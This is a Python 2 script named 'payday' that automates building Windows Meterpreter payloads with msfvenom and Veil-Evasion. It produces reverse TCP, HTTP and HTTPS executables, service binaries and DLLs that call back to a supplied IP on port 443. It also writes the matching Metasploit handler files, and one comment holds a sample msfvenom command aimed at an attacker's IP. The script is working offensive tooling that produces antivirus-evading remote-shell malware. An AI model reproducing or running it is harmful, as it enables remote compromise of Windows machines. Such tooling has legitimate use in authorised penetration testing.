#!/usr/bin/python
# Author : Matt Lorentzen
# version 0.4

import os, sys, time, argparse

def banner():

	version = "the beanster edition"
    
	banner = """
                       _
 _ __   __ _ _   _  __| | __ _ _   _
| '_ \ / _` | | | |/ _` |/ _` | | | |
| |_) | (_| | |_| | (_| | (_| | |_| |
| .__/ \__,_|\__, |\__,_|\__,_|\__, |
|_|          |___/             |___/

                 %s
""" %version
     
	print redtxt(banner)


def msf_payloads(ip, output_dir):
	# Payloads Dictionary
	payloads = []

	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe", "revmet.exe"])
	payloads.append(["windows/x64/meterpreter/reverse_tcp", 443, "exe", "revmet64.exe"])
	payloads.append(["windows/meterpreter/reverse_http",443, "exe", "methttp.exe"])
	payloads.append(["windows/meterpreter/reverse_https",443, "exe", "methttps.exe"])
	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "exe-service" , "serv64.exe"])
	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe-service" ,"serv.exe"])
	payloads.append(["windows/meterpreter/reverse_tcp",443, "dll", "revmetdll.dll"])
	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "dll", "revmetdll64.dll"])

	#./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe

	for parms in payloads:
		lhost = ip
		payload = parms[0]
		lport = str(parms[1])
		output_type = parms[2]
		ext = parms[3]
		base = output_dir
		venom_cmd = "msfvenom -p " + payload + " LHOST=" + ip + " LPORT=" + lport + " -f " + output_type + " -o " + base + ext
		print "[!] Generating : " + bluetxt(payload)
		os.system(venom_cmd)
		print "[!] Generating handler for : " + bluetxt(payload)
		# strip off ext and replace with .rc

		handler = ext.split(".")[0] + ".rc"
		handler_file = open(base + "handlers/" + handler , "w")
		handler_file.write("use exploit/multi/handler\n")
		handler_file.write("set payload " + payload +"\n")
		handler_file.write("set LPORT 443\n")
		handler_file.write("set LHOST " + ip + "\n")
		handler_file.write("exploit -j -z\n")
		handler_file.close()
		print "[!] Generated : " + yellowtxt(handler) + "\n\n"


def veil_payloads(ip, output_dir, move_payloads):
	""" Takes local IP address as LHOST parm and builds Veil payloads"""
	# Veil doesn't have a custom output directory option and the default path gets pulled from the config file
	# hacky approach :: copy each generated payload and hander in to the custom output directory if it is supplied
	veil_script = "/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py "
	# start empty list to hold
	payloads = []
	# appends payloads with nested 3 value list for dynamic parm calling
	payloads.append(["cs/meterpreter/rev_https", 443, "veil_rev_https"])
	payloads.append(["c/meterpreter/rev_tcp",443,"veil_rev_tcp_met"])
	payloads.append(["c/meterpreter/rev_http_service",443, "veil_rev_http_srv"])


	print "Creating Veil Goodness"
	for parms in payloads:
		lhost = ip
		payload = parms[0]
		lport = str(parms[1])
		output = parms[2]
		command = ("-p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output + " --overwrite")
		os.system(veil_script + command)
		time.sleep(2)
		# if using a custom output directory, veil doesn't have an option to specify the base directory as it gets this from the conf file
		# payload generated above has unique 'base' name - access the list and check the boolean flag that is pushed in
		# if this is true, move the file/handler into the custom output directory so that all payloads are in custom location
		if move_payloads == True:
			# move payload
			os.system("mv /root/payloads/windows/" + output + ".exe "  + output_dir)
			os.system("mv /root/payloads/windows/" + output + ".dll "  + output_dir)
			# move handler
			os.system("mv /root/payloads/windows/handlers/" + output + "_handler.rc " + output_dir + "handlers")


def clean(payload_path):
	""" Cleans out directory """
	# start with default Veil direcory - gets rid of hashes etc
	os.system("/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py --clean")
	os.system("clear")
 	print yellowtxt("[!] Now cleaning default output directory\n")
	# clean out generated payloads in default or custom directory
	for file in os.listdir(payload_path):
		file = payload_path + file
		if os.path.isfile(file):
			print "[!] Removing " + bluetxt(file)
			os.remove(file)



def get_payload_output(payload_output_dir):
	""" Builds directory structure if output option is supplied """
	output_dir = payload_output_dir
	# check to see if the trailing slash has been added to the path : ie /root/path
	if not output_dir.endswith("/"):
		output_dir = output_dir + "/"

	# creates the structure if it doesn't exist
	if not os.path.isdir(output_dir):
		print yellowtxt("[!] Creating output directory structure")
		os.mkdir(output_dir)
		os.chdir(output_dir)
		os.mkdir('handlers')

	return output_dir



###############################
### 	Helper Functions	###
###############################

def redtxt(text2colour):
	redstart = "\033[0;31m"
	redend = "\033[0m"
	return redstart + text2colour + redend

def greentxt(text2colour):
	greenstart = "\033[0;32m"
	greenend = "\033[0m"
	return greenstart + text2colour + greenend

def yellowtxt(text2colour):
	yellowstart = "\033[0;33m"
	yellowend = "\033[0m"
	return yellowstart + text2colour + yellowend

def bluetxt(text2colour):
	bluestart = "\033[0;34m"
	blueend = "\033[0m"
	return bluestart + text2colour + blueend



##############################
##		 Main Function	   ###
##############################


def Main():
	# program version
	version = 0.3
	banner()
	default_path = '/root/payloads/windows'

	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil. Outputs to '/root/payloads/windows/' by default.")
	parser.add_argument("--veil", action="store_true", help='Veil Payloads')
	parser.add_argument("--msf", action="store_true", help='MSF Payloads > tcp/exe, tcp/http(s), exe-service, dll')
	parser.add_argument("--clean", action="store_true", help="Cleans out existing files in the output directory")
	parser.add_argument("--output", help="Specify new output directory.")
	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')

	# counts the supplied number of arguments and prints help if they are missing
	if len(sys.argv)==1:
		parser.print_help()
			
		sys.exit(1)

	args = parser.parse_args()

	# default variable setup
	ip = args.ip
	output_dir = ""
	move_payloads = False

	# set up default path
	if args.output:
		output = args.output
		output_dir = get_payload_output(output)
		move_payloads = True

	else:
		# default directory output :: Veil config points to the this location
		output_dir = "/root/payloads/windows/"
		# add check to see if this direcory exists and if not, create it
		if not os.path.isdir(output_dir):
			print bluetxt("[*] The default path : %s is missing") %output_dir
			print yellowtxt("[!] You need to create this default path")
			sys.exit(1)
			#os.mkdir(output_dir)
			#os.chdir(output_dir)
			#os.mkdir('handlers')


	if args.msf:
		if not ip:
			print "[!] IP address required with this payload option :: --msf --ip <Address>"
		else:
			print yellowtxt("[!] Encoding MSF Payloads")
			msf_payloads(ip, output_dir)

	if args.veil:
		if not ip:
			print "[!] IP address required with this payload option :: --veil --ip <Address>"
		else:
			print yellowtxt("[!] Encoding Veil payloads")
			veil_payloads(ip ,output_dir, move_payloads)

	if args.clean:
		if args.output:
			output_dir = get_payload_output(output)
			print redtxt("Cleaning out Payload and Handler File directories in : ") + yellowtxt(output_dir)
			clean(output_dir)
		else:
			payload_paths = ["/root/payloads/windows/","/root/payloads/windows/handlers/"]
			print redtxt("Cleaning out Payload and Handler File directories")
			for payload_path in payload_paths:
				clean(payload_path)


if __name__ == "__main__":
	Main()
